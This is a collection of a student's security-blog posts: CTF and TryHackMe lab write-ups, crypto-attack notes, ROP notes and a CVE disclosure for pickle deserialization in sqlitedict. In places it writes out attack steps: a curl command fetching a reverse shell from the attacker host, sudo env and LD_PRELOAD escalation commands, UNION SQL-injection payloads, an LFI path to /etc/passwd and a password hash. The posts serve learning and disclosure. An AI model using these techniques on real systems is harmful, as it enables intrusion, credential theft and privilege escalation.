entry.title: NCKUCTF Write Up
entry.content:
Before all

This CTF for beginners just popped up on SCINT, and Iâ€™m so busy currently so I didnâ€™t participate the CTF seriously.
But some problems are interesting and I still learned from them, down below are the write ups~

Write Up

Preview Card

A gopher SSRF!!!
The main reason I want to have this writeup!
The home page of it has only two links, one is the flag but only localhost can read it, and the other is a kink like this:

I tried it and found out a XSS, and I was like, â€œWell, is ther an admin bot?â€
The answer is NO!
After many different tries, I gave it up and check out the hint:

Ok, ok, I know what is SSRF, but WTH is gopher.
Gopher is an protocal before http, which are commonly known for their extensive tunneling activities and their ability to destroy farms and gardens.(From wikipedia :D)
The exploit for this challenge is to send a post request asking for localhost by gopher and see the sesults from debug on the page.
link about gopher ssrf
payload generator
My first payload:

and i got a request like this:

Wellâ€¦. I have to post a data as givemeflag=yes

flag popped!!!

Jinja2

A SSTI (Server Side Template Injection), but since Iâ€™m not familiar with flask that much, so I googled the payloadâ€¦â€¦.
SSTI payloads
The principle of SSTI is that the frame Jinja2 would describe a string with this pattern ({{.*}}) as a template element, and it could be Inject by connect some builtin magics to become RCE
my payload:

The source:

Cat

An php serialization+command injection.
The soucre:

and I was provided a cookie like this:

What it looks like after base64 decoded:

I just wanted to chamge my payload cat_32337 into cat_322337'; ls echo 'a.
But that didnâ€™t work!
After a few minutes, I realized that it was a php serialization string, and in this payload, s:9:â€cat_32337â€ represent a string object, size of 9 and the value is â€œcat_32337â€, so I also need to change my size value XD
My payload:

What it looks like after base64 decoded:

Rahh!!!!

Yet Another Username Password Checker

Challenge file
This challenge allow two inputs, and itâ€™s without stack canary and PIE, so it allows an ret2shellcode exploit.
Method:
First make the global variable become a shellcode get from exploit-db, and ret to the shellcode by BOF while inputing the second variable.
My solve script:

p.s. Iâ€™m so cinfused that I consider ret2shellcode as a kind of BOF, but the flag and some other websites said that itâ€™s a kind of ROPâ€¦â€¦

bof

Challenge file
Just bof with ret2code~~~
My solve script:

puRely high School mAth

An RSA with five primes and a formula with five roots of the primes.
solution:phi(n)/totient(n)=f(1)*-1
An easy but quite creative one.
Challenge source:

datas:

solve script:

entry.title: Block Cipher Mode note
entry.content:
Before all

A quick Block Cipher Mode review for myself.
All the exploits down below are for Labs made by Oalieno

Recommended Course

Block Cipher Mode

Cut and Paste Attack

EBC MODE vulnerability
Because in ECB mode, size of an block is always 16 bytes, so even though we canâ€™t crack it, itâ€™s still feasible to construct datas with specific size and rearrange the encrypted blocks which bring spoofing
Exploit

Prepend Oracle

EBC MODE vulnerability
This method can be used when your input would be encrypted with message you want to encrpt
The main idea is to enumerate through characters until itâ€™s same with encrypted blocks generated from only padding input.
Exploit

Padding Oracle

CBC MODE vulnerability
This method can be used when itâ€™s possible to get the IV(Initialized Iector) value and the padding method is knowned. Also, itâ€™s necessary that there exist some clues to check whether the input is unpaded successfuly or not
The main idea is to enumerate through characters until the message have been unpad successfuly, and remember to adjust the iv value sended cautiously!

How to cauculate the correct value after unpad successfuly?
that byte of data = Now_Trying ^ IV Value at that position ^ padding
cur=xor(k, iv[now], (16-now))+cur
cur = the decrypted block,
k = the value be tried now,
16-now = padding.
Exploit

entry.title: 2023 Cake CTF Write Up
entry.content:
Team Name:WAN
Rank:142/729
Link:https://2023.cakectf.com/teams/2247781930/

Before all

While I was at my school Feild Day, my team members(Aukro & Naup) in WAN invited me to participate in this CTF XD.
Beside the Welcome and Survey challenges, I solved two web challenges and Naup solved a pwn challenge this time, not bad though.

Write up

TOWFL

Solver : Whale120

An exam web application which would generate some strange sentences with unknow characters every time and you have to get flag by getting a full mark on it.
There are a hundred strange problems, after a try on this application with Burp Suite, I found out two key points:

  • The submition would be post to path /api/submit and the submission result can be get by path:/api/score. The statements would be the same every time if the sessions are the same.
  • It would return your score every time.
    So my solution is to enumerate the answer of a problem every time by sending packages with the same session and check whether itâ€™s right by the increase/decrease of score.
    about 400 tries, I finally get flag!!!
    Finall packets:
  • Submit
  • Get score Finall Result: My arms were almost broken by brute forcing through thisâ€¦

Country DB

Solver : Whale120

An simple web application use to search country ID by input two charaters every time.
Its backend is setup by sqlite3 and python flask, and it would filter user input by this:

Search query:

And I was stucked at here because I was thicking about SQL Injection with two characters
After about 30 minutes, I tried to send packages like this while I was testing sqlite and list container on python:

And there was a 500 error code but not 400, which means that this can passed the length filter!!!
So I constructed my payload into this:

Because python would consider the json of parameter code a list with legth 2, although sqlite canâ€™t accept a list like object, but it can be a string if I add a annotation -- in the middle of my payload. Base on these, this UNION SQL Injection payload is effective!
Finall Request:

vtable4b

Solver : Naup

C++ pwn with vtable.

simple signature

Solver : No one :<

server.py

I was stucking on cauculate the values of x or u or r, but not thinking about bypass the verification QAQ.
And I found out the solution after contest, which I change the signature value s into pow(2, (h(m)-1)*inverse(w, p-1), p) and signature value t into pow(2, inverse(-v, p-1), p), this can easily bypass the verification without knowing the value of every keysğŸ™ƒ.
Finall Result:

After all

We have only three members in our team and we arenâ€™t as professional as other teams, so a good experience and performance, keep going on!

entry.title: ConvertMyVideo on TryHackMe
entry.content:
Before all

Wellâ€¦ I was stucked at the last step of this box, after I searched otherâ€™s Write Up, I learned a new tool - pspy which can moniter linux processes without root.

Victimâ€™s IP : 10.10.3.97
Attackerâ€™s IP : 10.9.195.189

Write Up

RECON

port scan

Command:

Result:

nothing special thoughâ€¦

directory enumeration

Command:

Result:
The most interesting part is the admin directory which required http-get auth.

Exploitation

command injection

The web page look like this, and after some tries, I found out a vulnerability with command injection.

The interesting part is that it would block the space character and cut the post data with &(me crying out loud : is and not end!!!)
Anyway, is still easy to bypass by ${IFS}
Setting up a http server to make victim downloads the php reverse shell.

I opened it on port 10000

Listening on port 1004 and wait for the reverse shell work:

Command injection payload:

And just visit http://10.10.3.97:10000/reverse.php to get shell on port 1004

password cracking

Wellâ€¦although I donâ€™t know why I should do this, but I must do this to complete the challenge(

File:/var/www/html/admin/.htpasswd

Content:itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/

Simple crack with john:
Command:

Result:

Privilege Escalation

pspy

https://github.com/DominicBreuker/pspy

Install it on victimâ€™s machine:

And after a while, I noticed that thereâ€™s a cronjob run with UID=0, which probably run by root

reverse shell again

Base on the cronjob discovered before, I edited the content of clean.sh to get a rootâ€™s shell.

Open port 5427 on my computer:

Finallyâ€¦

Get shell!!!

After all

I am still procrastinating on my write up for Year of the Fox on TryHackMe â€¦

entry.title: Cyberlens on Tryhackme
entry.content:
Before all

I havenâ€™t posted any pentesting write up recently.
It means that I trained my penetration skill hardly recently(but preparing school exams and reversing LOL), time to practice ~
Victimâ€™s IP : 10.10.231.218
Victimâ€™s Host : cyberlens.thm
Attackerâ€™s IP : 10.9.195.189

Write up

RECON

port scan

command

Found out an interesting service on port 61777 (Apache Tika 1.17 Server)

Exploit

CVE-2018-1335

Exploiting Tika 1.17 server

After a quick searching on exploit-db, I tried this exploit on msfconsole, and gain a user shell.

Privilege Escalation

Exploiting AlwaysInstallElevated

I used PrivescCheck.ps1 script to check PE Vectors on this machine.

The AlwaysInstallElevated setting allows users to install msi file with adminâ€™s privilege and run it with the same privilege, either.

So, just spawn a vicious msi file with msfvenom:

Grep it with Victimâ€™s machine and run ~

Aha !

After all

My first pentesting on my New Ubuntu VM >w<

References
https://juggernaut-sec.com/alwaysinstallelevated/

entry.title: dogcat CTF Writeup on TryHackMe
entry.content:
Before all

Wolf~
Meow~
Womp~
Thereâ€™s an imposter amoung us

Victim IP : 10.10.2.219
My IP : 10.8.211.34

Write Up

RECON

RECON isnâ€™t meaningful to this lab thoughâ€¦

Port Scanning

nmap

Path Searching

dirsearch

dirsearch -u http://10.10.2.219
And it found out an empty page : flag.php

Web Exploiting

This was a simple php site with two choices between dog and cat, and the most interesting part were their paths:
http://10.10.2.219/?view=dog
http://10.10.2.219/?view=cat
So it might had an LFI vulnerability.

LFI

I first tried out something like this:
http://10.10.2.219/?view=../../../../../../../etc/passwd
Well, I was blicked >:

It seems like the url parameter needed to contain cat or dog.
After a few minutes, I tried out something like this:
http://10.10.2.219/?view=dog/../cat

Hooray, this bypass was succeed.

LFI with php filter:
Click here for more informations
http://10.10.2.219/?view=php://filter/convert.base64-encode/resource=dog/../flag
The flag after base64 encoded appeared:

RCE with php filter chain:
Iâ€™ve wrote a simple RCE script based on this.
Source CODE:

PHP Reverse Shell

I first set up a http server with my revershell(reverse.php on port 1221) and ran this command through the filter chain shell:
curl http://10.8.211.34:1221/reverse.php -o shell.php
And the revershell was uploaded, source of php revershell:

Open the listener of my ip on port 5124 and the revershell on victem site:

Get shell!!!

Privilege Escalation

sudo -l

env escalation

GTFOBins
sudo env /bin/bash

Looking for flag:
find / | grep flag
it was in /root/flag3.txt

Container Escape

I learned this from otherâ€™s writeupğŸ˜…
Anyway, the site would run the file backup.sh in opt/backups every minute, so itâ€™s feasible to rewrite backup.sh into another revershell to escape container after a minute.

One minute later:

After all

Thanks for the nice container escape, I really learned from that XD.
How about my midterm examâ€¦â€¦.

entry.title: BugDB Series on Hacker101CTF
entry.content:
Before all

The two challenges are both about GraphQL, and I just used the corresponding tools burp suite provide to solve them!

Reference(Port Swigger):https://portswigger.net/web-security/graphql

BugDB v1

introspection

Introspection is a step for schema information discovering.
Just type some stuffs and send it, meanwhile, right click on that history (in Burp Suite) and send it to responder.

In the request part, change to the GraphQL view and set an IntrospectionQuery.

Next, send it to sitemap, then feasible queries for the api are all in the target page!


Finally, I chose a query and send it to Repeater, removed all the variable params, and dumped all â€œallBugsâ€ datas!

BugDB v2

introspection

Same as I done up there, but this time thereâ€™s a mutation function availible!

And also, if I directly use the query access â€œallBugsâ€ just like the way I did before, thereâ€™s only an admin report but not the victimâ€™s one.

mutation

Mutation is a process which is used for making changes to datas.
Furthermore, thereâ€™s a â€œprivateâ€ paramter in the extracted data.

So, for solving this challengem, just change the â€œprivateâ€ value for the Bug with id=2 into â€œtrueâ€ through mutation!


P.S. Just remember that DONNOT change the text value LOL.

entry.title: Encrypted Pastebin on Hacker101CTF
entry.content:
Before all

To my surprise, this is a three years lasting journey on solving this challenge â€¦

This is an interesting challenge combined several simple technique and is well worth solving!

Write Up

This is a web application which has a posting function just like Pastebin, after you sent a post, it would generate a unique key for that post, you can see the post only if you have the right key in the url.

Also, base on the paragraph in the home page, the key is probably generated with AES-128 CBC Mode.

RECON

A url example is down below.
https://669099f2c694bc3cf1c1f5ae19016f77.ctf.hacker101.com/?post=KWJlR2cCCcGYhMBdPSotLiWdHcoNMiYSSTNoRL9zfRTLGTFdFdu9xBxiXc9SJFQ5NEGkB90mbkF-zvdqnoT4X2fQykzaXWCMY7CX3IwyYXRnAAICk4d98bTrUHXRVENpfQ5sANV9fGIDT-eWO4EUD4H2nSL5egynC6TAfEXoRzs92SQLeu7V1JLc06I5-WraCOH38VOdkr-jmQYRZ!cgTQ~~
First of all, I tried to change the key value and observe the response.

But after I simply added an â€˜aâ€™ to the front of the â€˜postâ€™ param, I got a response like thisâ€¦

First flag gotten!

How if I change the key into a single character â€˜aâ€™?

https://a49c182743e0b433bba6232c5961b860.ctf.hacker101.com/?post=a

It shows that it is base64 encode but with some naughty changes on it.

Also, if I add some padding in the â€˜postâ€™ parameter, it would raise a PaddingExceptionâ€¦

Maybe is time for a Padding Oracle Attack!

Padding Oracle

Wikipedia(link)

I put some threading magic on it to make it faster!
padding_oracle.py

After I extracted the data, I got my second flag and known that is a json format data!
{"flag": "^FLAG^5dc0bd44bc917ef1ab7e76de1be3f8d213c7d324acd52409b92ab8ce1764623e$FLAG$", "id": "2", "key": "FJRyMS3Ib4aor0M9RPTfcQ~~"}

Well, speaking honestly, I had a wrong idea that the CBC key is just the extracted key in the json data, but after I tried to decrypt the message directly through the IV value and that suspecious key, I known that Iâ€™m wrong QwQâ€¦

Bit flipping

I tried to modify the data into {"id":"1"}, and this can be done through a simple bit flipping attack.
Take a quick review on CBC MODE process:

Itâ€™s trivial that I can get the raw decrypted value for the first block (or any other block) of the oringinal ciphertext through an XOR operation with the IV value and the first block of the ciphertext.

So the flipping payload should be:
xor(initial_IV, b'{"flag": "^FLAG^', b'{"id":"1"}')+the_first_block_of_the_ciphertext

Flag 3:

SQL Injection

How can I do if I want to generate a payload with a length larger than 16?

A quick reminder:
Before moving forward to this, how to get the raw decrypted value for a block of any ciphertext?
Padding Oracle Again
Since itâ€™s feasible to decrypt any block, downbelow is my solving process:
take the last block of ciphertext as a value which I already known it's raw decrypted value.
->
The further block should be the xored value of the raw content I want to put with that block of ciphertext
->
decrypt the value of the further block
And after repeating these steps, I can modify any messages I want to put and try some SQL Injection!

solve.py
The wanted variable is the SQL Injection(Union base) payload in json format.

Gaining database names
{"id":"7 UNION SELECT group_concat(database()), 1"}

Gaining table names
{"id": "7 UNION SELECT group_concat(table_name), 1 FROM information_schema.tables WHERE table_schema=database()"}

Gaining column names for table tracking
{"id":"7 UNION SELECT group_concat(column_name), 1 FROM information_schema.columns WHERE table_name='tracking'"}

Extract Header datas from table tracking
{"id":"7 UNION SELECT group_concat(headers), 1 FROM tracking"}

And finally, go to the dumped url from table â€˜trackingâ€™ and get the last flag!

entry.title: LD_PRELOAD and Mongo Notes
entry.content:
Before all

I learned these from Road on TryHackMe today

Notes

Mongo DB

It usually runs on port 27017

payloads(?):

Look for working services

MongoDB

LD_PRELOAD

LD_PRELOAD is a function allows any program to share libraries.

payloads:

shell.c

library compilation
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
add LD_PRELOAD with sudo
sudo LD_PRELOAD=/home/webdeveloper/shell.so sky_backup_utility
In case of sudo result like this:

env_keep+=LD_PRELOAD

entry.content:
Before all

After I written the web writeups for it, itâ€™s time to have some cryptography~
LoTuXCTF.com

Write Up

Story Teller

Itâ€™s a system which you have to netcat to the machine and receive some strings of the story, a tricky point, the option 2 to show the entire story arenâ€™t availible, which took me some time to get the part containing the flag XD.
After receiving some strings, I guessed that was subtituition cipher, and I threw it into online solver :)
Solver link
Payload:

Plaintext(?)

Ahâ€¦ A little bit spelling mistake but I could fix that!
Flag:LoTuX{Cr4cK_TraNspOs1tion_c1ph3r}

Ultra Easy RSA

This is the RSA source code of it:

and this is the cipher text and public keys:

We can observe that the difference between p and q is low, so itâ€™s a good way to enumeration through the difference.

This was my solve script:

and finally, I got the flag:LoTuX{4sYmm3tR1c}

Bad Privacy

The source:

ciphertext:

Since the d is too small, the Wienerâ€™s Attack would work!(Maybe there would be a post in future talking about Wienerâ€™s Attack)
Wienerâ€™s Attack on Python
Online Solver
and the CRYING FLAG:
LoTuX{Oh_n0!_W1en3r_4t7@ck_M3!}
LMAO

Johnny

First of all, the shadow file in Linux will store all the passwordsâ€™ hash+salt and passwd file would record users and its home file location
In this challenge, I already got the passwd file + shadow file, so itâ€™s time to unshadow it:

after this step, I would like to use john + rockyou.txt to bruteforce the hash:

and the password revealed:

nc to the server and got the flag:

How is your math

I was saccrafied because I didnâ€™t know AES well at that time, but after a brain storming, I realized that its just a simple XOR XD
After connected to the server, some data would be retrieved

Since we can use XOR to cauculate new cipher text, is easy to write a solve script down below

FLAG: LoTuX{Bit_Flipping_is_a_usefull_skill!}
thx to the flag, I learned that the name of this skill is Bit Flipping

An LLL(Known High Bits Of p one)

which gave me the most parts of p, it allows an LLL attackâ€¦

entry.title: LoTuX CTF WriteUp-Web
entry.content:
Before all

I start my challenges on LoTuX CTF from May, and Iâ€™ve solved most of the Web and Cryptography Challenges on this platform now, down below are my WPs :)
LoTuXCTF.com

Write Up

HTML

An e4sy challenge, start with a veiw source~

there were two hidden bottons doing functions cat() and magic(), so I typed it on console.
After that, I entered a page with a title This is a cute cat and a page called secret, and collected two partial flags LoTuX{fR0nT_ and 3nD_h1Dden_.
Finally, inspect the page secret again and there was also a hidden page which its path was flag.html.
Opened flag.html, and got the last part of flag Mes54ge}.

Usefull tools

Also a starter one
First I just opened the webpage and found out a hint called burp5u17e_ch4ll3nge
So I opened Burp Suite and caught a packet,and the header had an option called challenge with a value 0, so I just changed it into 1 and got a partial flag LoTuX{bd244966385a624 and a hint told me to use curl.
Next, sent a curl payload:

And received these informations:

So I changed the payload into this:

And some informations appeared:

So I used a OPTIONS to get its http method options, but nothing appeared, so I added an -i to my payload and saw the headers:

wellâ€¦ there was an option called H1DD3N_HT7P_ME7H0D, just sent a payload with it and I got the second part of flag:

received datas:

partial flag and a hint told me to try python request, this was my payload:

And FINALLY ended, quite a little bit tired bruh

Trending Cats

A site contained some meme cats, the links of the pictures were interseting:

So I used gobuster to crack the paths from 0000 to 9999 :

There was a hidden image:

With the word written on it(spin cat), just opened the path: http://lotuxctf.com:20003/spin.php, thereâ€™s a base 64 value aGFwcHk= on the button, changed it into the base64 of â€œspinâ€
And thereâ€™s cute flag~~~
LoTuX{Th3reR2kinds0fc4tv1dEos}

forum

First of all, I logged in as user with the account/password provided
Ok, there were some posts but only admin can edit itâ€¦
So I back to the login page and bypass the password with a simple SQL Injection payloads:

Aha, logged in successful and got the second(?!) part of flag at the first postâ€¦

So.. whereâ€™s my first flag XD
I was just stucked by here after ten minutes, I found out the first flag is at post0.phpâ€¦

What an IDOR ğŸ™ƒ

Cookie Stealer

An message board Web app which you can let the admin visit your post at your homepage.
I just used a xss payload down below and steal cookies with webhook.site.

and clicked â€œshare to adminâ€, back to the webhook site and got the flag~~
BTW, thereâ€™s also a XSS payload written in php if the site has some other protections:

and check the path logger.txt

Over!!!

LoTuX CTF Min 0

First, I used githacking to get the git file:

Then I moved to the file and checked out the logs:

Response:

Reset to the previous one:

there was a file: init.sql, I found the flag and also a sql injection for LoTuX CTF Min 1
flag:
LoTuX{Why_1s_thi$_per50n_sO_c4r3le5s?}

LoTuX CTF Min 1

By sql injection found at challenge 0, I used a UNION BASE SQL Injection Payload as a user name to register

And I got the flag.
LoTuX{Wh4t_@_maRv3l0u5_de$1gn_7h1s_1s?!?}

Blank Site 1

A BLANK site with only a picture, check out the url of it:

Maybe a LFI?

Aha! down below are the contents of it:

I got the flag, and also the path '/1d538e83d6f6b08f' to exploit boot id for Blank Site 2.

Image Uploader 1

An image upload web app, just sent a php backdoor XD.

I just visited the path and got rce, with simple observation I found out flag.txt(it was at there but now deleted by some auful challengers):

How2Login

Ah, my first thouhgt was like, â€œwellâ€¦just a sql injection bypass with 300 points(?!)â€.
Nope haha, so I opened my owasp and glimpse a path called test.php
(p.s. It could be found out with dirsearch but my owasp tool did this first XD)
And it was a site to check if user exist, and the link was just like this:

SQL Injection!!!
I opened sqlmap and used the payload:

And it was an Error-BASE SQL Injection and the data was hashed by sha256, but a weak password XD
data dumped:

Cute Flag: LoTuX{Inj3ct1on&HAAAsh}

THE EYE 2

Blank Site 2

Nothing found but a port : 32768 with the same function as port : 80.

Web Exploitation

This is a simple market website, you can register your account and add new items.

XSS

Though thereâ€™s no webhook.site to use, itâ€™s still feasible to set up a simple http server with python.

entry.title: My First CVE! Exploiting sqlitedict (CVE-2024-35515)
entry.content:
Before all

Impacted: sqlitedict <= 2.1.0

CVE-2024-35515

This vulnerability might cause via code excution locally.

I found out this vulnerability on 2024/05/07 while I was dealing with my school scientific project, and just reported it to TWCERT(They also have a service for cve reporting) the next day but got rejected because they only dealing with CVE about Taiwanese products. And I also sync this issue on github(But I guess the author wonâ€™t patch this vuln QwQ)

After that, I reported the same stuffs to MITRE, and received their reply on 2024/5/29.

Anyway, though this is not a BIG 0-day report, but is definitely a thrilling exprience for me, and give me lots of motivation!

How I exploit it?

pickle insecure deserialization

In a python class object, a __reduce__ method would be triggered with pickle.loads(deserialization) function.

So a malicious class dumped with pickle like this can cause via code excution when it loaded by pickle.loads.

code review with sqlitedict

https://github.com/piskvorky/sqlitedict/blob/master/sqlitedict.py

line 50~53
Importing dumps, loads function.

line 120~127
The insecure encode/decode functions.

And finally, in class SqliteDict:

the self.decode function is same as the previous decode function.

And the __getitem__ method is called with an â€˜aray-likeâ€™ identifying (for example : arr[1] is same as arr.__getitem__(1))

So I can generate a malicious sqlite file including the previous code excution pickle payload.

PoC_generator.py

PoC_open_sql.py

Result:

After all

owo?

entry.title: Mr.Robot CTF Writeup on TryHackMe
entry.content:
Before all

This was a fun one and I learned a lot.
But I donâ€™t like such a big dictionary file which would cause a long term brute forcing â€¦â€¦

Victim IP : 10.10.187.227
My IP : 10.4.46.164

Write Up

Start Up

Download my ovpn file and connect with it~(Which I can merely do on hackerboxâ€¦.)
sudo openvpn williamlin254.ovpn

Recon

Port Scanning

nmap

nmap -sC -sV -PN 10.10.187.227

Results:

Nothing special because itâ€™s already knowned theres a http service and ssh is closed.

Path Searching

dirsearch

dirsearch -u http://10.10.187.227

Interesting Paths:

So first check out robots.txt, there are two files:

fsocity.dic is a dictionary that is used to brute forcing,and key-1-of-3.txt is the first flag~~~

Web Exploiting

Brute Foring

Next, checkout the path wp-login, after a few tries on it, notice that it would return whether your user input is right, so I brute forced on that:

WFUZZ

wfuzz -u "http://10.10.225.248/wp-login.php" -d " log=FUZZ&pwd=a" --hs "Invalid username" -w fsocity.dic

The username is Elliot, how about the password?
After an hour, thereâ€™s still no resultsâ€¦â€¦.(after trying about 30000 passwords), so I checked out online and found out that the password is the 858851th of the dictionary fileâ€¦â€¦.
Anyway, my attack would still work.
By the way, the password is the user id of Elliot account on twitter :)
Twitter:ER28-0652

PHP Reverse Shell

After logged in, just replace the 404 page into a PHP Reverse Shell.
my source from github-pentestmonkey

Open http://10.10.187.227/rahlin(or anything lead to a 404 code :> ) and port 5123 on my computer:
sudo nc -nlvp 5123

Privilege Escalation

After connected, first confirm which permission I haveâ€¦
whoami
results:
daemon
wellâ€¦the lowest one :D
Changing directory to home:
cd home/robot
ls
Results:

Reading files:
cat password.raw-md5
Results:
robot:c3fcd3d76192e4007dfb496cca67e13b
Which leaks a weak password abcdefghijklmnopqrstuvwxyz
Changing Permission with su:

wellâ€¦ I was stucked by here.

Python Escalation

This would stabilize is to a terminal.

Searching for Escalation Breakpoints

Thereâ€™s no LinPEAS to use QQ.
Find usable commands/files.
find / -perm -u=s -type f 2>/dev/null
results:

nmap would be a good choice.

NMAP Escalation

Finding srcipt on GTFOBins.
Escalation Script:

FLAG 2:

FLAG 3:

WELL DONE!!!

After all

This made my day, but it would be even better if thereâ€™s no need of a huge password bruteforcing(Can be replaced with a OSINT?)
Good Night World~

entry.title: msfconsole Note
entry.content:
Before all

While I was exploiting the blog lab on Tryhackme today, I was unable to exploit the wordpress site with cve 2019-8943 python poc, so I finally tried this out and succeeded.
There are still a lot of usage and methods I think, so this post would be updated in future.

Note

All usage with msfconsole should be done after RECON.

  • search for vulnerabilities:

  • use an exploit

  • set Target IP and attackerâ€™s IP

  • exploit

  • error?
    According to the error message above, I need to use the exploit with the account/password I found before and exploit it again.

  • shell

    Get shell~

entry.title: Return Oriented Program note
entry.content:
Before all

I had posted a note of pwn for beginners(link here), and recently Iâ€™ve learned more about ROP, so here is this post~

ROP

What is ROP?

ROP(Return Oriented Program) is an attack method extended from BOF(Buffer Overflow), in ROP, the key point is to cover return address and lead it to Program Fragments you want(can be repeated many times if you have many usable fragments).
Basically, a fragment end with ret is mostly used.

x86_64 ROP

In x86_64, size of an address is 8 bytes(p64 in pwntool), so registers used frequently are rax, rdi, rsi, rdx â€¦â€¦
To connect the ROP Chain, itâ€™s important to make sure every register called in the function, and find the corresponding fregment in the program. Is easy to find fregment with tools such as ROPgadget and pwntool.
ROPgadget:

In this command, I want to find a gadget start with mov_dword and end with ret.
but is much more easier to find a register fragment with pwntool.
pwntool

In x86_64 system, if a variable want to be executive(or other action), it needs an syscall.

syscall table
syscall table has each register need for every call and the meaning for each register.
p.s. execve is excution call.
Connect fragment like pop rdi; ret with a value can modify the value of rdi and move to mext fregment(possibly a function or syscall)
An example for an excution syscall:

This ROP chain would make the value of rax become 0x3b(execve on syscall table), and rdi value become the address of shellcode(like string: /bin/sh\x00)
\x00 is a symbol to stop reading.
Also, vmmap in geb-peda is often used to find writable(or something else) datas.

x86 ROP

Same logic as x86_64
syscall table
Some differents between x86 and x86_64:

  1. In x86 system, each address and register are mostly 4 bytes
  2. int80 in x86 has the same function with syscall in x86_64
    Example:
    execve in x86:

Challenges

Pwnasm from LoTuX CTF

Click link
Itâ€™s a simple ROP
Solution
Start with pwntool:

Extracted datas:

Itâ€™s a x86_64 system(amd64), so check out the syscall table ,register gadgets needed to trigger syscall are rax, rdi, rsi, rdx.
Also, from the reverse result by Ghidra
there are some weird datas on the stack(our shell('/bin/sh' at0x00402000) and first part of flag), so itâ€™s possible to construct an ROP Chain and excuse the shell

Extracted datas:

Finally, my exploit code:

echo server

file
source code
A x86_64 file
ROP Chain:
pop rdi; ret->change rdi location to global variable->trigger get function->return to runCMD function to bypass getString() filtering function
Exploit:

rop1-sean_Pwn-2

file
Stack Migration

Stack Migration

Stack Migration is a technique to cover register base into a modified stack location, and the first 8 bytes(if itâ€™s a x86_64 system)/first 4 bytes(if itâ€™s a x86 system) need to be a location for new register(garbage)

Solution

First write the ROP Chain into global variable, and trgger it in func1, remember to leave.

ropfu from picoCTF

link
An i386 (x86) system, key points are on above.
Use fragments like mov dword [edx] eax; ret to write shell on eax into location edx.
p.s.the shell input need to be converted into hex and reversed
exploit

entry.content:
Team Name:WAN
Rank:74
Link:https://2023.sunshinectf.org/teams/295

WEB

BeepBoop Blog

Slover: å ‡å§¬naup

You can observe a suspicious URL, which has patterns.
You can get something by using different numbers after the URL path /post/
https://beepboop.web.2023.sunshinectf.games/post/1

I guess the flag may be hidden in one of the paths.

Solve Script

It can make requests starting from 0 and check whether there is a flag in it.

Get FLAG!!

FLAG:sun{wh00ps_4ll_IDOR}

Hotdog Stand

Solver: Whale120

The challenge is a simple login page, after some tries on sql injection, the official release an information about challenge fixing(while I was on flask-unsignâ€¦â€¦).
After fixed, we can get /hotdog-database/fromrobots.txt, and we can see username and password in it, LOL!

FLAG:sun{5l1c3d_p1cKl35_4nd_0N10N2}

CRYPTO

BeepBoop Cryptography

Solver: Whale120
text:
beep beep beep beep boop beep boop beep beep boop boop beep beep boop boop beep beep boop boop beep boop beep beep beep beep boop boop beep beep beep beep boop beep boop boop boop boop beep boop boop beep boop boop boop beep beep boop beep beep boop boop beep boop beep boop boop beep boop boop beep beep boop boop boop beep boop boop boop beep beep boop beep beep boop boop beep beep boop beep boop beep boop boop boop boop beep boop beep beep boop boop boop beep boop boop beep beep boop boop beep beep beep beep boop beep boop boop beep boop boop boop beep beep boop boop beep beep boop boop boop beep boop boop boop beep beep boop beep beep beep boop beep boop boop beep boop beep boop boop boop beep beep boop beep beep boop boop beep boop beep boop boop beep boop boop beep beep boop boop boop beep boop boop boop beep beep boop beep beep boop boop beep beep boop beep boop beep boop boop boop boop beep boop beep beep boop boop boop beep boop boop beep beep boop boop beep beep beep beep boop beep boop boop beep boop boop boop beep beep boop boop beep beep boop boop boop beep boop boop boop beep beep boop beep beep beep boop beep boop boop beep boop beep boop boop boop beep beep boop beep beep boop boop beep boop beep boop boop beep boop boop beep beep boop boop boop beep boop boop boop beep beep boop beep beep boop boop beep beep boop beep boop beep boop boop boop boop beep boop beep beep boop boop boop beep boop boop beep beep boop boop beep beep beep beep boop beep boop boop beep boop boop boop beep beep boop boop beep beep boop boop boop beep boop boop boop beep beep boop beep beep boop boop boop boop boop beep boop

turn it into 0/1, and decode with binary, would get something like this:
fha{rkgrezvangr-rkgrezvangr-rkgrezvangr}
Caeser cipher decrypt:

FLAG:sun{exterminate-exterminate-exterminate}

MISC

PWN

ğŸ˜ Array of Sunshine â˜€ï¸



We can see an obvious bug scanf("%s",&fruit[v1])
and It didnâ€™t check if v1 is out of index
Also protection is Partial RELRO and fruit is a global variable.
So we know it has a GOT hijack

There is a win function which will $cat flag
and when print_sym !=MEMORY[0x404020] at the same time MEMORY[0x404020] is 0x6 (known by gdb)

I gonna hijack exit@got[plt] to win function
Because of NO-PIE we know exit@got[plt] at 0x405040, fruit at 0x405080 (It means exit@got[plt] is at fruit[-8])

slove script:

Flag:

sun{a_ray_of_sunshine_bouncing_around}

Flock of Seagulls ğŸ•Šï¸


With IDA decompiling I found out a function call chain
main->fun1->fun2->fun3->fun4->fun5
also it has a ret adr check chain (didnâ€™t check fuc1->main)
fun5->fun4->fun3->fun2->fun1-x>main
and a backdoor function call win


It gave us rsp and also has a huge BOF
with No PIE we can just write back the ret adr to bypass the check
and write func1's ret adr to win

I also use gdb to help me write bypass payload more easily

slove script:

Flag:

sun{here_then_there_then_everywhere}

Bug Spray ğŸ›ğŸª²ğŸ

First thing first we use IDA Decompile it
IDA_DECOMPILE
imo that IDA didnâ€™t decompile correctly
so i chose to oberserve the Assembly code


In this block we know we have RWX at 0x777777 and its size is 0x12c
also we know after this block
r10=r12=0x64

Our target is goto Lable:off for the rwx segment

Todo

At the top two blocks of this picture we know it hope the length we wrote is 0x44 or 0x45 (0x64 <= rax+20 < 0x66)

After that it do syscall, and we know 0x64 stands for sys_time, 0x65 stands for sys_ptrace, after testing we know only sys_ptrace is possible to return 0

So, weâ€™ll send 0x45 bytes
syscalltable

For serveral times testing, I finally found out that CANâ€™T get shell by calling execve("/bin/sh")
so i change to use orw and try to get flag

Finally I get the flag

btw the flag is at ./flag.txt

slove script:

Flag:

sun{mosquitos_and_horseflies_and_triangle_bugs_oh_my}

Scripting

DDR


The first time we remote and press enter
Suddenly I lose (x

Now we know we have to do this with scripts
when i try pwntools I found out that it send \xe2\x87\xa6\xe2\x87\xa8\xe2\x87\xa6and things like that

just use python script to slove this

slove script:

Flag:

sun{d0_r0b0t5_kn0w_h0w_t0_d4nc3}

SimonProgrammer 1

A site that woud press some links and play some frequency , the mission is to follow it every timeâ€¦
Solution:
